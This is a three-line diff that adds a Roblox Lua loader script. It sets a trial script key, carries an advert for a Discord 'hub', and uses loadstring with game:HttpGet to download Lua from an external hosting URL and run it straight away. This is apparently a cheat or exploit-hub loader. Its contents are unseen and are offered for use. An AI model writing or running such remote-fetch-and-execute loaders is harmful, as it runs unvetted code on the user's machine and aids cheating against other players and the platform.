@@ -1,0 +1,3 @@
+script_key = "trial"
+-- https://dsc.gg/astralhub | best free hub alive!
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/a287f7c64a7eea2a08095e6ffc335b1fd678eafb1f9cfed8ed0380c64cbee8c4.lua"))()
